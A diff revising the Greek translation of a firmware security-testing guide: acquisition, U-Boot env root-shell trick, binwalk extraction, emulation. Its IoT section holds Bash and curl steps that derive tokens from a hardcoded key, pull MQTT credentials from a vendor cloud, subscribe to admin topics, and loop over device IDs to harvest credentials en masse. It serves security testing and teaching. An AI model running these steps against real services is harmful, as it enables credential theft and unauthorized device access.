@@ -23,55 +23,55 @@ android-mediatek-secure-boot-bl2_ext-bypass-el3.md
 mediatek-xflash-carbonara-da2-hash-bypass.md
 {{#endref}}
 
-Το Firmware είναι απαραίτητο λογισμικό που επιτρέπει στις συσκευές να λειτουργούν σωστά, διαχειριζόμενο και διευκολύνοντας την επικοινωνία μεταξύ των hardware components και του software με το οποίο αλληλεπιδρούν οι χρήστες. Αποθηκεύεται σε μόνιμη μνήμη, διασφαλίζοντας ότι η συσκευή μπορεί να έχει πρόσβαση σε ζωτικές οδηγίες από τη στιγμή που ενεργοποιείται, οδηγώντας στην εκκίνηση του operating system. Η εξέταση και η πιθανή τροποποίηση του firmware είναι ένα κρίσιμο βήμα για τον εντοπισμό security vulnerabilities.
+Το firmware είναι απαραίτητο software που επιτρέπει στις συσκευές να λειτουργούν σωστά, διαχειριζόμενο και διευκολύνοντας την επικοινωνία μεταξύ των hardware components και του software με το οποίο αλληλεπιδρούν οι χρήστες. Αποθηκεύεται σε μόνιμη μνήμη, διασφαλίζοντας ότι η συσκευή μπορεί να έχει πρόσβαση σε κρίσιμες οδηγίες από τη στιγμή που ενεργοποιείται, οδηγώντας στην εκκίνηση του operating system. Η εξέταση και η πιθανή τροποποίηση του firmware αποτελεί κρίσιμο βήμα για τον εντοπισμό security vulnerabilities.
 
-## **Συλλογή Πληροφοριών**
+## **Συλλογή πληροφοριών**
 
-Η **συλλογή πληροφοριών** είναι ένα κρίσιμο αρχικό βήμα για την κατανόηση της σύνθεσης μιας συσκευής και των τεχνολογιών που χρησιμοποιεί. Αυτή η διαδικασία περιλαμβάνει τη συλλογή δεδομένων για:
+Η **συλλογή πληροφοριών** αποτελεί κρίσιμο αρχικό βήμα για την κατανόηση της σύνθεσης μιας συσκευής και των τεχνολογιών που χρησιμοποιεί. Αυτή η διαδικασία περιλαμβάνει τη συλλογή δεδομένων σχετικά με:
 
-- Την CPU architecture και το operating system που εκτελεί
-- Λεπτομέρειες του bootloader
-- Διάταξη hardware και datasheets
-- Μετρικές του codebase και τοποθεσίες του source
-- Εξωτερικές libraries και τύπους license
-- Ιστορικά updates και κανονιστικές πιστοποιήσεις
-- Architectural and flow diagrams
-- Security assessments και εντοπισμένα vulnerabilities
+- Την αρχιτεκτονική του CPU και το operating system που εκτελεί
+- Τα χαρακτηριστικά του bootloader
+- Τη διάταξη του hardware και τα datasheets
+- Μετρήσεις του codebase και τοποθεσίες του source code
+- External libraries και τύπους licenses
+- Ιστορικά updates και regulatory certifications
+- Διαγράμματα αρχιτεκτονικής και ροής
+- Security assessments και εντοπισμένες vulnerabilities
 
-Για αυτόν τον σκοπό, τα εργαλεία **open-source intelligence (OSINT)** είναι ανεκτίμητα, όπως και η ανάλυση οποιωνδήποτε διαθέσιμων open-source software components μέσω διαδικασιών χειροκίνητου και αυτοματοποιημένου review. Εργαλεία όπως τα [Coverity Scan](https://scan.coverity.com) και [Semmle’s LGTM](https://lgtm.com/#explore) προσφέρουν δωρεάν static analysis που μπορεί να αξιοποιηθεί για τον εντοπισμό πιθανών issues.
+Για αυτόν τον σκοπό, τα εργαλεία **open-source intelligence (OSINT)** είναι πολύτιμα, όπως και η ανάλυση τυχόν διαθέσιμων open-source software components μέσω manual και automated review processes. Εργαλεία όπως τα [Coverity Scan](https://scan.coverity.com) και [Semmle’s LGTM](https://lgtm.com/#explore) προσφέρουν δωρεάν static analysis, την οποία μπορείτε να αξιοποιήσετε για τον εντοπισμό πιθανών προβλημάτων.
 
 ## **Απόκτηση του Firmware**
 
-Η απόκτηση firmware μπορεί να γίνει με διάφορους τρόπους, ο καθένας με το δικό του επίπεδο πολυπλοκότητας:
+Η απόκτηση firmware μπορεί να γίνει με διάφορους τρόπους, καθένας από τους οποίους έχει διαφορετικό επίπεδο πολυπλοκότητας:
 
 - **Απευθείας** από την πηγή (developers, manufacturers)
-- **Building** από τις παρεχόμενες οδηγίες
-- **Λήψη** από official support sites
-- Χρήση **Google dork** queries για τον εντοπισμό hosted firmware files
-- Άμεση πρόσβαση σε **cloud storage**, με εργαλεία όπως το [S3Scanner](https://github.com/sa7mon/S3Scanner)
-- Παρεμβολή στις **updates** μέσω τεχνικών man-in-the-middle
-- **Extracting** από τη συσκευή μέσω συνδέσεων όπως **UART**, **JTAG** ή **PICit**
-- **Sniffing** για update requests μέσα στην επικοινωνία της συσκευής
-- Εντοπισμός και χρήση **hardcoded update endpoints**
-- **Dumping** από το bootloader ή το δίκτυο
-- **Αφαίρεση και ανάγνωση** του storage chip, όταν όλα τα άλλα αποτυγχάνουν, χρησιμοποιώντας κατάλληλα hardware tools
+- Με **Building** βάσει των παρεχόμενων οδηγιών
+- Με **Downloading** από επίσημα support sites
+- Με χρήση ερωτημάτων **Google dork** για την εύρεση hosted firmware files
+- Με απευθείας πρόσβαση σε **cloud storage**, μέσω εργαλείων όπως το [S3Scanner](https://github.com/sa7mon/S3Scanner)
+- Με interception των **updates** μέσω man-in-the-middle techniques
+- Με **Extracting** από τη συσκευή μέσω συνδέσεων όπως **UART**, **JTAG** ή **PICit**
+- Με **Sniffing** για update requests στο πλαίσιο της επικοινωνίας της συσκευής
+- Με τον εντοπισμό και τη χρήση **hardcoded update endpoints**
+- Με **Dumping** από τον bootloader ή το network
+- Με **Removing and reading** το storage chip, όταν όλα τα άλλα αποτυγχάνουν, χρησιμοποιώντας τα κατάλληλα hardware tools
 
-### UART-only logs: force a root shell via U-Boot env in flash
+### Logs μόνο μέσω UART: εξαναγκασμός root shell μέσω του U-Boot env στο flash
 
-If UART RX is ignored (logs only), you can still force an init shell by **editing the U-Boot environment blob** offline:
+Αν το UART RX αγνοείται (μόνο logs), μπορείτε και πάλι να εξαναγκάσετε ένα init shell **επεξεργαζόμενοι το U-Boot environment blob** offline:
 
-1. Dump SPI flash with a SOIC-8 clip + programmer (3.3V):
+1. Κάντε dump του SPI flash με SOIC-8 clip και programmer (3.3V):
 ```bash
 flashrom -p ch341a_spi -r flash.bin
 ```
-2. Locate the U-Boot env partition, edit `bootargs` to include `init=/bin/sh`, and **recompute the U-Boot env CRC32** for the blob.
-3. Reflash only the env partition and reboot; a shell should appear on UART.
+2. Εντοπίστε το U-Boot env partition, επεξεργαστείτε το `bootargs` ώστε να περιλαμβάνει `init=/bin/sh` και **υπολογίστε ξανά το U-Boot env CRC32** για το blob.
+3. Κάντε reflash μόνο στο env partition και επανεκκινήστε. Ένα shell θα πρέπει να εμφανιστεί στο UART.
 
-This is useful on embedded devices where the bootloader shell is disabled but the env partition is writable via external flash access.
+Αυτό είναι χρήσιμο σε embedded devices όπου το bootloader shell είναι απενεργοποιημένο, αλλά το env partition είναι writable μέσω external flash access.
 
 ## Ανάλυση του firmware
 
-Τώρα που **έχεις το firmware**, πρέπει να εξαγάγεις πληροφορίες σχετικά με αυτό για να ξέρεις πώς να το χειριστείς. Διαφορετικά εργαλεία που μπορείς να χρησιμοποιήσεις για αυτό:
+Τώρα που **έχετε το firmware**, πρέπει να εξαγάγετε πληροφορίες σχετικά με αυτό, ώστε να γνωρίζετε πώς να το χειριστείτε. Υπάρχουν διάφορα εργαλεία που μπορείτε να χρησιμοποιήσετε για αυτό:
 ```bash
 file <bin>
 strings -n8 <bin>
@@ -80,25 +80,25 @@ hexdump -C -n 512 <bin> > hexdump.out
 hexdump -C <bin> | head # might find signatures in header
 fdisk -lu <bin> #lists a drives partition and filesystems if multiple
 ```
-Αν δεν βρεις πολλά με αυτά τα tools, έλεγξε το **entropy** της image με `binwalk -E <bin>`· αν είναι χαμηλό, τότε μάλλον δεν είναι encrypted. Αν είναι υψηλό, μάλλον είναι encrypted (ή compressed με κάποιον τρόπο).
+Αν δεν βρείτε πολλά με αυτά τα εργαλεία, ελέγξτε το **entropy** της εικόνας με `binwalk -E <bin>`. Αν το entropy είναι χαμηλό, τότε πιθανότατα δεν είναι κρυπτογραφημένη. Αν το entropy είναι υψηλό, είναι πιθανό να είναι κρυπτογραφημένη (ή συμπιεσμένη με κάποιον τρόπο).
 
-Επιπλέον, μπορείς να χρησιμοποιήσεις αυτά τα tools για να εξάγεις **files embedded inside the firmware**:
+Επιπλέον, μπορείτε να χρησιμοποιήσετε αυτά τα εργαλεία για να εξαγάγετε **αρχεία ενσωματωμένα μέσα στο firmware**:
 
 
 {{#ref}}
 ../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
 {{#endref}}
 
-Ή το [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) για να επιθεωρήσεις το file.
+Ή το [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) για να επιθεωρήσετε το αρχείο.
 
-### Getting the Filesystem
+### Λήψη του Filesystem
 
-Με τα προηγούμενα commented tools όπως `binwalk -ev <bin>` θα έπρεπε να έχεις καταφέρει να **extract the filesystem**.\
-Το Binwalk συνήθως το κάνει extract μέσα σε έναν **folder named as the filesystem type**, που συνήθως είναι ένα από τα ακόλουθα: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.
+Με τα προηγούμενα εργαλεία, όπως το `binwalk -ev <bin>`, θα πρέπει να έχετε καταφέρει να **εξαγάγετε το filesystem**.\
+Το Binwalk συνήθως το εξάγει μέσα σε έναν **φάκελο με όνομα ίδιο με τον τύπο του filesystem**, ο οποίος συνήθως είναι ένας από τους εξής: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.
 
-#### Manual Filesystem Extraction
+#### Χειροκίνητη Εξαγωγή του Filesystem
 
-Μερικές φορές, το binwalk **δεν θα έχει το magic byte of the filesystem στα signatures του**. Σε αυτές τις περιπτώσεις, χρησιμοποίησε το binwalk για να **βρεις το offset of the filesystem και carve το compressed filesystem** από το binary και να το **extract manually** σύμφωνα με τον τύπο του, χρησιμοποιώντας τα παρακάτω βήματα.
+Μερικές φορές, το binwalk **δεν θα έχει το magic byte του filesystem στις signatures του**. Σε αυτές τις περιπτώσεις, χρησιμοποιήστε το binwalk για να **βρείτε το offset του filesystem και να κάνετε carve το συμπιεσμένο filesystem** από το binary και, στη συνέχεια, να **εξαγάγετε χειροκίνητα** το filesystem σύμφωνα με τον τύπο του, χρησιμοποιώντας τα παρακάτω βήματα.
 ```
 $ binwalk DIR850L_REVB.bin
 
@@ -110,7 +110,7 @@ DECIMAL HEXADECIMAL DESCRIPTION
 1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
 1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
 ```
-Εκτελέστε την ακόλουθη **dd command** για carving του Squashfs filesystem.
+Εκτελέστε την ακόλουθη **dd command** για την εξαγωγή του filesystem Squashfs.
 ```
 $ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
 
@@ -120,37 +120,37 @@ $ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
 
 8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
 ```
-Εναλλακτικά, η ακόλουθη εντολή μπορεί επίσης να εκτελεστεί.
+Εναλλακτικά, θα μπορούσε να εκτελεστεί και η ακόλουθη εντολή.
 
 `$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`
 
-- Για squashfs (χρησιμοποιείται στο παραπάνω παράδειγμα)
+- Για squashfs (που χρησιμοποιείται στο παραπάνω παράδειγμα)
 
 `$ unsquashfs dir.squashfs`
 
-Τα αρχεία θα βρίσκονται afterward στον κατάλογο "`squashfs-root`".
+Τα αρχεία θα βρίσκονται στη συνέχεια στον κατάλογο "`squashfs-root`".
 
-- CPIO archive files
+- Αρχεία archive CPIO
 
 `$ cpio -ivd --no-absolute-filenames -F <bin>`
 
-- Για jffs2 filesystems
+- Για filesystems jffs2
 
 `$ jefferson rootfsfile.jffs2`
 
-- Για ubifs filesystems με NAND flash
+- Για filesystems ubifs με NAND flash
 
 `$ ubireader_extract_images -u UBI -s <start_offset> <bin>`
 
 `$ ubidump.py <bin>`
 
-## Αναλύοντας Firmware
+## Ανάλυση Firmware
 
-Μόλις αποκτηθεί το firmware, είναι απαραίτητο να αποσυναρμολογηθεί για να γίνει κατανοητή η δομή του και οι πιθανές ευπάθειες. Αυτή η διαδικασία περιλαμβάνει τη χρήση διαφόρων εργαλείων για την ανάλυση και την εξαγωγή πολύτιμων δεδομένων από το firmware image.
+Μόλις αποκτηθεί το firmware, είναι απαραίτητο να αναλυθεί λεπτομερώς για την κατανόηση της δομής του και των πιθανών ευπαθειών του. Αυτή η διαδικασία περιλαμβάνει τη χρήση διαφόρων εργαλείων για την ανάλυση και την εξαγωγή χρήσιμων δεδομένων από το firmware image.
 
-### Initial Analysis Tools
+### Εργαλεία αρχικής ανάλυσης
 
-Παρέχεται ένα σύνολο εντολών για αρχικό έλεγχο του binary file (αναφέρεται ως `<bin>`). Αυτές οι εντολές βοηθούν στην αναγνώριση file types, στην εξαγωγή strings, στην ανάλυση binary data και στην κατανόηση των λεπτομερειών του partition και του filesystem:
+Παρέχεται ένα σύνολο εντολών για την αρχική επιθεώρηση του binary file (στο οποίο γίνεται αναφορά ως `<bin>`). Αυτές οι εντολές βοηθούν στον προσδιορισμό των τύπων αρχείων, στην εξαγωγή strings, στην ανάλυση binary data και στην κατανόηση των λεπτομερειών των partitions και των filesystems:
 ```bash
 file <bin>
 strings -n8 <bin>
@@ -159,72 +159,72 @@ hexdump -C -n 512 <bin> > hexdump.out
 hexdump -C <bin> | head #useful for finding signatures in the header
 fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
 ```
-Για να αξιολογηθεί η κατάσταση κρυπτογράφησης της εικόνας, ελέγχεται η **entropy** με `binwalk -E <bin>`. Η χαμηλή entropy υποδηλώνει έλλειψη κρυπτογράφησης, ενώ η υψηλή entropy δείχνει πιθανή κρυπτογράφηση ή συμπίεση.
+Για την αξιολόγηση της κατάστασης κρυπτογράφησης του image, ελέγχεται το **entropy** με `binwalk -E <bin>`. Χαμηλό entropy υποδηλώνει έλλειψη κρυπτογράφησης, ενώ υψηλό entropy υποδεικνύει πιθανή κρυπτογράφηση ή συμπίεση.
 
-Για την εξαγωγή **embedded files**, προτείνονται εργαλεία και πόροι όπως η τεκμηρίωση **file-data-carving-recovery-tools** και το **binvis.io** για επιθεώρηση αρχείων.
+Για την εξαγωγή **embedded files**, συνιστώνται εργαλεία και resources όπως το documentation **file-data-carving-recovery-tools** και το **binvis.io** για επιθεώρηση αρχείων.
 
-### Extracting the Filesystem
+### Εξαγωγή του Filesystem
 
-Χρησιμοποιώντας `binwalk -ev <bin>`, μπορεί συνήθως να εξαχθεί το filesystem, συχνά σε έναν κατάλογο ονομασμένο σύμφωνα με τον τύπο του filesystem (π.χ. squashfs, ubifs). Ωστόσο, όταν το **binwalk** αποτυγχάνει να αναγνωρίσει τον τύπο του filesystem λόγω έλλειψης magic bytes, απαιτείται χειροκίνητη εξαγωγή. Αυτό περιλαμβάνει τη χρήση του `binwalk` για τον εντοπισμό του offset του filesystem, ακολουθούμενο από την εντολή `dd` για την αποκοπή του filesystem:
+Με τη χρήση του `binwalk -ev <bin>`, συνήθως μπορεί να εξαχθεί το filesystem, συχνά σε έναν κατάλογο με όνομα που αντιστοιχεί στον τύπο του filesystem (π.χ. squashfs, ubifs). Ωστόσο, όταν το **binwalk** αποτυγχάνει να αναγνωρίσει τον τύπο του filesystem λόγω απουσίας magic bytes, απαιτείται χειροκίνητη εξαγωγή. Αυτό περιλαμβάνει τη χρήση του `binwalk` για τον εντοπισμό του offset του filesystem και, στη συνέχεια, την εντολή `dd` για την αποκοπή του filesystem:
 ```bash
 $ binwalk DIR850L_REVB.bin
 
 $ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
 ```
-Στη συνέχεια, ανάλογα με τον τύπο του filesystem (π.χ., squashfs, cpio, jffs2, ubifs), χρησιμοποιούνται διαφορετικές εντολές για τη χειροκίνητη εξαγωγή του περιεχομένου.
+Στη συνέχεια, ανάλογα με τον τύπο του filesystem (π.χ. squashfs, cpio, jffs2, ubifs), χρησιμοποιούνται διαφορετικές εντολές για τη χειροκίνητη εξαγωγή των περιεχομένων.
 
-### Ανάλυση filesystem
+### Ανάλυση Filesystem
 
-Μετά την εξαγωγή του filesystem, ξεκινά η αναζήτηση για security flaws. Δίνεται προσοχή σε insecure network daemons, hardcoded credentials, API endpoints, λειτουργίες update server, μη μεταγλωττισμένο code, startup scripts και compiled binaries για offline analysis.
+Με το filesystem εξαχθέν, ξεκινά η αναζήτηση security flaws. Η προσοχή επικεντρώνεται σε μη ασφαλή network daemons, hardcoded credentials, API endpoints, λειτουργίες update server, μη μεταγλωττισμένο κώδικα, startup scripts και compiled binaries για offline analysis.
 
-**Βασικές τοποθεσίες** και **αντικείμενα** που πρέπει να ελεγχθούν περιλαμβάνουν:
+**Βασικές τοποθεσίες** και **στοιχεία** προς έλεγχο περιλαμβάνουν:
 
-- **etc/shadow** και **etc/passwd** για user credentials
+- Τα **etc/shadow** και **etc/passwd** για user credentials
 - SSL certificates και keys στο **etc/ssl**
-- Configuration και script files για πιθανές vulnerabilities
+- Αρχεία configuration και scripts για πιθανές vulnerabilities
 - Embedded binaries για περαιτέρω analysis
-- Common IoT device web servers και binaries
+- Συνηθισμένους web servers και binaries συσκευών IoT
 
-Πολλά tools βοηθούν στην αποκάλυψη sensitive information και vulnerabilities μέσα στο filesystem:
+Αρκετά tools βοηθούν στην αποκάλυψη sensitive information και vulnerabilities μέσα στο filesystem:
 
-- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) και [**Firmwalker**](https://github.com/craigz28/firmwalker) για αναζήτηση sensitive information
-- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) για comprehensive firmware analysis
-- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go), και [**EMBA**](https://github.com/e-m-b-a/emba) για static και dynamic analysis
+- Τα [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) και [**Firmwalker**](https://github.com/craigz28/firmwalker) για αναζήτηση sensitive information
+- Το [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) για comprehensive firmware analysis
+- Τα [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) και [**EMBA**](https://github.com/e-m-b-a/emba) για static και dynamic analysis
 
 ### Security Checks σε Compiled Binaries
 
-Τόσο ο source code όσο και τα compiled binaries που βρίσκονται στο filesystem πρέπει να εξετάζονται προσεκτικά για vulnerabilities. Tools όπως το **checksec.sh** για Unix binaries και το **PESecurity** για Windows binaries βοηθούν στον εντοπισμό unprotected binaries που θα μπορούσαν να αξιοποιηθούν.
+Τόσο ο source code όσο και τα compiled binaries που εντοπίζονται στο filesystem πρέπει να ελέγχονται σχολαστικά για vulnerabilities. Tools όπως το **checksec.sh** για Unix binaries και το **PESecurity** για Windows binaries βοηθούν στον εντοπισμό μη προστατευμένων binaries που θα μπορούσαν να γίνουν exploit.
 
-## Harvesting cloud config and MQTT credentials via derived URL tokens
+## Συλλογή cloud config και MQTT credentials μέσω derived URL tokens
 
-Πολλά IoT hubs αντλούν το per-device configuration τους από ένα cloud endpoint που μοιάζει με:
+Πολλά IoT hubs λαμβάνουν το per-device configuration τους από ένα cloud endpoint που έχει τη μορφή:
 
 - `https://<api-host>/pf/<deviceId>/<token>`
 
-Κατά την analysis του firmware μπορεί να διαπιστώσετε ότι το `<token>` παράγεται τοπικά από το device ID χρησιμοποιώντας ένα hardcoded secret, για παράδειγμα:
+Κατά τη διάρκεια του firmware analysis μπορεί να διαπιστώσετε ότι το `<token>` προκύπτει τοπικά από το device ID χρησιμοποιώντας ένα hardcoded secret, για παράδειγμα:
 
 - token = MD5( deviceId || STATIC_KEY ) και αναπαρίσταται ως uppercase hex
 
-Αυτό το design επιτρέπει σε οποιονδήποτε μάθει ένα deviceId και το STATIC_KEY να ανακατασκευάσει το URL και να αντλήσει cloud config, αποκαλύπτοντας συχνά plaintext MQTT credentials και topic prefixes.
+Αυτός ο σχεδιασμός επιτρέπει σε οποιονδήποτε γνωρίζει ένα deviceId και το STATIC_KEY να ανακατασκευάσει το URL και να κατεβάσει το cloud config, αποκαλύπτοντας συχνά plaintext MQTT credentials και topic prefixes.
 
-Practical workflow:
+Πρακτικό workflow:
 
-1) Extract deviceId from UART boot logs
+1) Εξαγωγή του deviceId από τα UART boot logs
 
-- Connect a 3.3V UART adapter (TX/RX/GND) and capture logs:
+- Συνδέστε έναν 3.3V UART adapter (TX/RX/GND) και καταγράψτε τα logs:
 ```bash
 picocom -b 115200 /dev/ttyUSB0
 ```
-- Αναζητήστε γραμμές που τυπώνουν το pattern του cloud config URL και τη διεύθυνση του broker, για παράδειγμα:
+- Αναζητήστε γραμμές που εκτυπώνουν το URL pattern του cloud config και τη διεύθυνση του broker, για παράδειγμα:
 ```
 Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
 MQTT: mqtt://mq-gw.vendor.tld:8001
 ```
-2) Ανάκτησε το STATIC_KEY και τον αλγόριθμο token από το firmware
+2) Ανάκτηση των STATIC_KEY και του αλγορίθμου token από το firmware
 
-- Φόρτωσε τα binaries σε Ghidra/radare2 και αναζήτησε το config path ("/pf/") ή χρήση MD5.
-- Επιβεβαίωσε τον αλγόριθμο (π.χ. MD5(deviceId||STATIC_KEY)).
-- Παράγαγε το token σε Bash και κάνε uppercase το digest:
+- Φορτώστε τα binaries στο Ghidra/radare2 και αναζητήστε το config path (`"/pf/"`) ή χρήση του MD5.
+- Επιβεβαιώστε τον αλγόριθμο (π.χ. `MD5(deviceId||STATIC_KEY)`).
+- Παράγετε το token σε Bash και μετατρέψτε το digest σε κεφαλαία:
 ```bash
 DEVICE_ID="d88b00112233"
 STATIC_KEY="cf50deadbeefcafebabe"
@@ -232,25 +232,25 @@ printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
 ```
 3) Συλλογή cloud config και MQTT credentials
 
-- Compose το URL και κατέβασε JSON με curl; κάνε parse με jq για να εξαγάγεις secrets:
+- Δημιούργησε το URL και ανάκτησε το JSON με curl· κάνε parse με jq για να εξαγάγεις secrets:
 ```bash
 API_HOST="https://api.vendor.tld"
 TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
 curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
 # Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
 ```
-4) Κατάχρηση plaintext MQTT και αδύναμων topic ACLs (αν υπάρχουν)
+4) Κατάχρηση plaintext MQTT και αδύναμων ACLs θεμάτων (αν υπάρχουν)
 
-- Χρησιμοποίησε τα ανακτημένα credentials για να κάνεις subscribe σε maintenance topics και να αναζητήσεις sensitive events:
+- Χρησιμοποιήστε τα ανακτημένα διαπιστευτήρια για subscribe σε maintenance topics και αναζητήστε ευαίσθητα συμβάντα:
 ```bash
 mosquitto_sub -h <broker> -p <port> -V mqttv311 \
 -i <client_id> -u <username> -P <password> \
 -t "<topic_prefix>/<deviceId>/admin" -v
 ```
-5) Απαρίθμησε προβλέψιμα device IDs (σε κλίμακα, με authorization)
+5) Enumerate προβλέψιμα device IDs (σε κλίμακα, με authorization)
 
-- Πολλά ecosystems ενσωματώνουν vendor OUI/product/type bytes ακολουθούμενα από ένα sequential suffix.
-- Μπορείς να κάνεις iterate candidate IDs, να derive tokens και να fetch configs programmatically:
+- Πολλά ecosystems ενσωματώνουν bytes του vendor OUI/product/type, ακολουθούμενα από ένα sequential suffix.
+- Μπορείτε να κάνετε iterate σε candidate IDs, να παράγετε tokens και να κάνετε fetch configs programmatically:
 ```bash
 API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
 for SUF in $(seq -w 000000 0000FF); do
@@ -260,44 +260,45 @@ curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.pas
 done
 ```
 Σημειώσεις
-- Πάντα να λαμβάνετε ρητή εξουσιοδότηση πριν επιχειρήσετε mass enumeration.
-- Προτιμήστε emulation ή static analysis για να ανακτήσετε secrets χωρίς να τροποποιήσετε το target hardware όταν είναι δυνατό.
+- Να λαμβάνετε πάντα explicit authorization πριν επιχειρήσετε mass enumeration.
+- Να προτιμάτε το emulation ή το static analysis για την ανάκτηση secrets χωρίς τροποποίηση του target hardware, όταν είναι δυνατό.
 
-Η διαδικασία emulating firmware επιτρέπει **dynamic analysis** είτε της λειτουργίας μιας συσκευής είτε ενός μεμονωμένου προγράμματος. Αυτή η προσέγγιση μπορεί να αντιμετωπίσει προκλήσεις με εξαρτήσεις από hardware ή architecture, αλλά η μεταφορά του root filesystem ή συγκεκριμένων binaries σε μια συσκευή με matching architecture και endianness, όπως ένα Raspberry Pi, ή σε ένα pre-built virtual machine, μπορεί να διευκολύνει περαιτέρω testing.
 
-### Emulating Individual Binaries
+Η διαδικασία emulation του firmware επιτρέπει **dynamic analysis** είτε της λειτουργίας μιας συσκευής είτε ενός μεμονωμένου προγράμματος. Αυτή η προσέγγιση μπορεί να αντιμετωπίσει προκλήσεις που σχετίζονται με dependencies του hardware ή της architecture, όμως η μεταφορά του root filesystem ή συγκεκριμένων binaries σε μια συσκευή με matching architecture και endianness, όπως ένα Raspberry Pi, ή σε μια pre-built virtual machine, μπορεί να διευκολύνει περαιτέρω testing.
 
-Για την εξέταση μεμονωμένων προγραμμάτων, είναι κρίσιμο να εντοπιστούν το endianness και η CPU architecture του προγράμματος.
+### Emulation μεμονωμένων Binaries
 
-#### Example with MIPS Architecture
+Για την εξέταση μεμονωμένων προγραμμάτων, είναι κρίσιμο να προσδιοριστούν το endianness και η CPU architecture του προγράμματος.
 
-Για να emulate ένα binary αρχιτεκτονικής MIPS, μπορεί κανείς να χρησιμοποιήσει την εντολή:
+#### Παράδειγμα με MIPS Architecture
+
+Για την emulation ενός binary με MIPS architecture, μπορεί να χρησιμοποιηθεί η εντολή:
 ```bash
 file ./squashfs-root/bin/busybox
 ```
-Και για να εγκαταστήσετε τα απαραίτητα emulation tools:
+Και για να εγκαταστήσετε τα απαραίτητα εργαλεία εξομοίωσης:
 ```bash
 sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
 ```
-Για MIPS (big-endian), χρησιμοποιείται το `qemu-mips`, και για little-endian binaries, το `qemu-mipsel` θα ήταν η επιλογή.
+Για MIPS (big-endian), χρησιμοποιείται το `qemu-mips`, ενώ για binaries little-endian, η επιλογή θα ήταν το `qemu-mipsel`.
 
-#### ARM Architecture Emulation
+#### Εξομοίωση ARM Architecture
 
-Για ARM binaries, η διαδικασία είναι παρόμοια, με τον emulator `qemu-arm` να χρησιμοποιείται για emulation.
+Για ARM binaries, η διαδικασία είναι παρόμοια, με τον emulator `qemu-arm` να χρησιμοποιείται για την εξομοίωση.
 
-### Full System Emulation
+### Εξομοίωση Πλήρους Συστήματος
 
-Εργαλεία όπως [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit), και άλλα, διευκολύνουν το full firmware emulation, αυτοματοποιώντας τη διαδικασία και βοηθώντας στο dynamic analysis.
+Εργαλεία όπως τα [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) και άλλα, διευκολύνουν την πλήρη εξομοίωση firmware, αυτοματοποιώντας τη διαδικασία και υποστηρίζοντας το dynamic analysis.
 
-## Dynamic Analysis in Practice
+## Dynamic Analysis στην Πράξη
 
-Σε αυτό το στάδιο, χρησιμοποιείται είτε ένα πραγματικό είτε ένα emulated device environment για analysis. Είναι απαραίτητο να διατηρείται shell access στο OS και το filesystem. Το emulation μπορεί να μην μιμείται τέλεια τις hardware interactions, απαιτώντας περιστασιακά επανεκκινήσεις του emulation. Το analysis θα πρέπει να επανεξετάζει το filesystem, να εκμεταλλεύεται exposed webpages και network services, και να εξερευνά bootloader vulnerabilities. Τα firmware integrity tests είναι κρίσιμα για τον εντοπισμό πιθανών backdoor vulnerabilities.
+Σε αυτό το στάδιο, χρησιμοποιείται για analysis είτε ένα πραγματικό είτε ένα emulated περιβάλλον συσκευής. Είναι απαραίτητο να διατηρείται shell access στο OS και στο filesystem. Η εξομοίωση ενδέχεται να μην αναπαράγει πλήρως τις αλληλεπιδράσεις με το hardware, γεγονός που μπορεί να απαιτεί περιστασιακά restart της εξομοίωσης. Το analysis θα πρέπει να επανεξετάζει το filesystem, να εκμεταλλεύεται exposed webpages και network services και να διερευνά vulnerabilities στον bootloader. Τα tests ακεραιότητας του firmware είναι κρίσιμα για τον εντοπισμό πιθανών backdoor vulnerabilities.
 
-## Runtime Analysis Techniques
+## Τεχνικές Runtime Analysis
 
-Το runtime analysis περιλαμβάνει αλληλεπίδραση με μια process ή binary στο operating environment του, χρησιμοποιώντας εργαλεία όπως gdb-multiarch, Frida, και Ghidra για τον ορισμό breakpoints και τον εντοπισμό vulnerabilities μέσω fuzzing και άλλων τεχνικών.
